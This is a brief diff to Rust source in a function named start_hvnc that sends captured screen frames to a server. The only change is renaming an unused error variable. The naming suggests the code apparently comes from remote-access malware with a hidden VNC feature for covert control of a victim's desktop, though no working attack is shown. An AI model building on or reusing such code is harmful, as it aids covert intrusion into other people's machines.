@@ -175,7 +175,7 @@ pub fn start_hvnc() {
                                         // Send frame
                                         let packet = ServerboundPacket::HVNCFrame(frame_data);
                                         
-                                        if let Err(e) = rt.block_on(send_packet(packet)) {
+                                        if let Err(_e) = rt.block_on(send_packet(packet)) {
                                         }
                                     }
                                 }
